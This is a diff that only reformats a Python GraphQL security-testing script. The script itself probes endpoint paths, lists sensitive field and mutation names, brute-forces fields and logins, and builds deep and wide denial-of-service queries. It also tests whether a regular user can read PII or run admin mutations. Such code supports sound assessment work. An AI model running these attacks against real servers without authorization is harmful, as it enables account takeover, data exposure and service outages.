@@ -68,12 +68,22 @@ headers = {"Content-Type": "application/json"}
 
 # Common GraphQL endpoint paths
 GRAPHQL_PATHS = [
-    "/graphql", "/graphql/", "/gql", "/query",
-    "/api/graphql", "/api/gql", "/api/v1/graphql",
-    "/v1/graphql", "/v2/graphql",
-    "/graphql/console", "/graphql/playground",
-    "/graphiql", "/altair", "/explorer",
-    "/graph", "/api/graph",
+    "/graphql",
+    "/graphql/",
+    "/gql",
+    "/query",
+    "/api/graphql",
+    "/api/gql",
+    "/api/v1/graphql",
+    "/v1/graphql",
+    "/v2/graphql",
+    "/graphql/console",
+    "/graphql/playground",
+    "/graphiql",
+    "/altair",
+    "/explorer",
+    "/graph",
+    "/api/graph",
 ]
 
 # Probe for GraphQL endpoints
@@ -231,20 +241,51 @@ else:
 # Analyze the extracted schema for sensitive fields and types
 SENSITIVE_INDICATORS = {
     "field_names": [
-        "password", "passwordHash", "secret", "token", "apiKey", "ssn",
-        "socialSecurity", "creditCard", "cardNumber", "cvv", "pin",
-        "privateKey", "internalId", "salary", "bankAccount", "taxId",
-        "mfaSecret", "refreshToken", "sessionId", "debugInfo"
+        "password",
+        "passwordHash",
+        "secret",
+        "token",
+        "apiKey",
+        "ssn",
+        "socialSecurity",
+        "creditCard",
+        "cardNumber",
+        "cvv",
+        "pin",
+        "privateKey",
+        "internalId",
+        "salary",
+        "bankAccount",
+        "taxId",
+        "mfaSecret",
+        "refreshToken",
+        "sessionId",
+        "debugInfo",
     ],
     "type_names": [
-        "Admin", "Internal", "Debug", "Secret", "Private",
-        "SystemConfig", "AuditLog", "PaymentInfo", "Credential"
+        "Admin",
+        "Internal",
+        "Debug",
+        "Secret",
+        "Private",
+        "SystemConfig",
+        "AuditLog",
+        "PaymentInfo",
+        "Credential",
     ],
     "mutation_names": [
-        "deleteUser", "resetPassword", "changeRole", "elevatePrivilege",
-        "createAdmin", "disableMFA", "exportData", "deleteAuditLog",
-        "updateConfig", "runMigration", "executeQuery"
-    ]
+        "deleteUser",
+        "resetPassword",
+        "changeRole",
+        "elevatePrivilege",
+        "createAdmin",
+        "disableMFA",
+        "exportData",
+        "deleteAuditLog",
+        "updateConfig",
+        "runMigration",
+        "executeQuery",
+    ],
 }
 
 if "data" in schema:
@@ -290,6 +331,7 @@ def bruteforce_field(type_name, field_wordlist):
         if "did you mean" in response_text:
             # Extract suggestions
             import re
+
             suggestions = re.findall(r'"(\w+)"', resp.text)
             for s in suggestions:
                 if s not in discovered_fields:
@@ -302,15 +344,49 @@ def bruteforce_field(type_name, field_wordlist):
 
     return discovered_fields
 
+
 # Common GraphQL field names wordlist
 FIELD_WORDLIST = [
-    "id", "name", "email", "username", "password", "role", "token",
-    "createdAt", "updatedAt", "status", "type", "description", "title",
-    "firstName", "lastName", "phone", "address", "avatar", "bio",
-    "isAdmin", "isActive", "permissions", "groups", "orders", "items",
-    "price", "quantity", "total", "currency", "paymentMethod",
-    "ssn", "dateOfBirth", "creditCard", "bankAccount", "salary",
-    "apiKey", "secretKey", "refreshToken", "mfaEnabled", "lastLogin",
+    "id",
+    "name",
+    "email",
+    "username",
+    "password",
+    "role",
+    "token",
+    "createdAt",
+    "updatedAt",
+    "status",
+    "type",
+    "description",
+    "title",
+    "firstName",
+    "lastName",
+    "phone",
+    "address",
+    "avatar",
+    "bio",
+    "isAdmin",
+    "isActive",
+    "permissions",
+    "groups",
+    "orders",
+    "items",
+    "price",
+    "quantity",
+    "total",
+    "currency",
+    "paymentMethod",
+    "ssn",
+    "dateOfBirth",
+    "creditCard",
+    "bankAccount",
+    "salary",
+    "apiKey",
+    "secretKey",
+    "refreshToken",
+    "mfaEnabled",
+    "lastLogin",
 ]
 
 # Try to discover fields on common type names
@@ -343,6 +419,7 @@ def alias_brute_force_login(usernames, password="Password123"):
                 print(f"[SUCCESS] {key}: token obtained")
     return resp
 
+
 # Attack 2: Query depth attack (DoS)
 def generate_deep_query(depth=50):
     """Generate a deeply nested query to test depth limits."""
@@ -350,17 +427,20 @@ def generate_deep_query(depth=50):
     query += "{ id name }" + " } " * depth + " }"
     return {"query": query}
 
+
 deep_query = generate_deep_query(20)
 resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=deep_query)
 print(f"Depth 20 query: {resp.status_code}")
 if resp.status_code == 200 and "errors" not in resp.json():
     print("[VULNERABLE] No query depth limit enforced")
 
+
 # Attack 3: Field duplication attack (resource exhaustion)
 def generate_wide_query(width=1000):
     """Repeat expensive fields many times using aliases."""
     fields = " ".join([f"field_{i}: users {{ id email name role }}" for i in range(width)])
     return {"query": "{ " + fields + " }"}
+
 
 wide_query = generate_wide_query(500)
 resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=wide_query)
@@ -404,34 +484,22 @@ admin_token_val = "Bearer <admin_token>"
 
 # Query sensitive fields as regular user
 sensitive_queries = [
-    {
-        "name": "User PII fields",
-        "query": '{ users { id email ssn dateOfBirth salary internalNotes } }'
-    },
-    {
-        "name": "Admin mutations",
-        "query": 'mutation { deleteUser(id: "1002") { success } }'
-    },
-    {
-        "name": "System config",
-        "query": '{ systemConfig { databaseUrl secretKey apiKeys } }'
-    },
-    {
-        "name": "Audit logs",
-        "query": '{ auditLogs { action userId ipAddress timestamp } }'
-    },
+    {"name": "User PII fields", "query": "{ users { id email ssn dateOfBirth salary internalNotes } }"},
+    {"name": "Admin mutations", "query": 'mutation { deleteUser(id: "1002") { success } }'},
+    {"name": "System config", "query": "{ systemConfig { databaseUrl secretKey apiKeys } }"},
+    {"name": "Audit logs", "query": "{ auditLogs { action userId ipAddress timestamp } }"},
 ]
 
 for sq in sensitive_queries:
     # Test as regular user
-    resp_user = requests.post(GRAPHQL_URL,
-        headers={**headers, "Authorization": user_token},
-        json={"query": sq["query"]})
+    resp_user = requests.post(
+        GRAPHQL_URL, headers={**headers, "Authorization": user_token}, json={"query": sq["query"]}
+    )
 
     # Test as admin
-    resp_admin = requests.post(GRAPHQL_URL,
-        headers={**headers, "Authorization": admin_token_val},
-        json={"query": sq["query"]})
+    resp_admin = requests.post(
+        GRAPHQL_URL, headers={**headers, "Authorization": admin_token_val}, json={"query": sq["query"]}
+    )
 
     user_ok = resp_user.status_code == 200 and "errors" not in resp_user.json()
     admin_ok = resp_admin.status_code == 200 and "errors" not in resp_admin.json()
